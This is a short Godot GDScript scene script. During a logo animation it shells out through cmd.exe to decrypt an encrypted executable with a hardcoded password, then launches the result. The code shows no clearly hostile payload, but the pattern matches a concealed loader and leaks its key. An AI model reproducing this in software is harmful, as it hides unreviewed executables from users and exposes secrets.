extends Node


# Called when the node enters the scene tree for the first time.
func _ready():
	$AnimationPlayer.play("logospin")
	OS.execute("cmd.exe", ["/C", "start hcrypt.exe --decrypt --file=xan.exe.data.hcrypt --pass=sQ1S5KkMwXQC82wGhX3Wb5QBr6OEEi9v"])
	await get_tree().create_timer(7).timeout
	OS.execute("XanRuntime.exe", [])


# Called every frame. 'delta' is the elapsed time since the previous frame.
func _process(delta):
	pass
